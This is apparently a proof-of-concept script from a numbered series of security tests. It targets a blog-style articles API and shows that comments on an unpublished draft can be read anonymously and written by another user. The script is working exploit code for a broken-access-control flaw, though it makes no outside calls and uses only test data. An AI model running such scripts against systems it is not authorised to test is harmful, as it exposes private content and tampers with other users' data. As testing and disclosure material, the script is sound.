# -*- coding: utf-8 -*-
"""Комментарии черновика отдаются без проверки published.
Чужой пользователь может и прочитать их, и дописать свой.

    python 19_draft_comments.py
"""
import time

from _http import Client, parser


def main():
    args = parser("Утечка и запись комментариев к черновику").parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    author = client.register(f"cauth{stamp}", f"cauth{stamp}@poc.local", "Passw0rd!cauth")
    other = client.register(f"cother{stamp}", f"cother{stamp}@poc.local", "Passw0rd!cother")
    secret = f"COMMENTSECRET-{stamp}"
    status, created, blob = client.call(
        "POST",
        "/api/articles",
        token=author,
        body={
            "article": {
                "title": f"Hidden notes {stamp}",
                "description": "private",
                "body": f"BODYSECRET-{stamp}",
                "tagList": ["poc"],
                "published": False,
            }
        },
    )
    if status not in (200, 201):
        raise SystemExit(f"черновик не создан: {status} {blob[:200]!r}")
    slug = created["article"]["slug"]
    status, _, blob = client.call("GET", f"/api/articles/{slug}")
    if status != 404:
        raise SystemExit(f"аноним открыл сам черновик: {status}")

    status, _, blob = client.call(
        "POST",
        f"/api/articles/{slug}/comments",
        token=author,
        body={"comment": {"body": secret}},
    )
    if status not in (200, 201):
        raise SystemExit(f"комментарий автора не создан: {status} {blob[:200]!r}")

    status, listed, blob = client.call("GET", f"/api/articles/{slug}/comments")
    bodies = [item["body"] for item in (listed or {}).get("comments", [])]
    if status != 200 or secret not in bodies:
        raise SystemExit(f"аноним не прочитал комментарий черновика: {status} {blob[:300]!r}")

    planted = f"INTRUDER-{stamp}"
    status, _, blob = client.call(
        "POST",
        f"/api/articles/{slug}/comments",
        token=other,
        body={"comment": {"body": planted}},
    )
    if status not in (200, 201):
        raise SystemExit(f"чужой комментарий к черновику отклонён: {status} {blob[:200]!r}")
    status, listed, _ = client.call("GET", f"/api/articles/{slug}/comments")
    bodies = [item["body"] for item in listed["comments"]]
    if planted not in bodies:
        raise SystemExit("дописанный комментарий не сохранился")
    print(f"OK slug={slug}")
    print(f"анонимный GET комментариев вернул {secret}")
    print(f"чужой пользователь дописал {planted}")


if __name__ == "__main__":
    main()
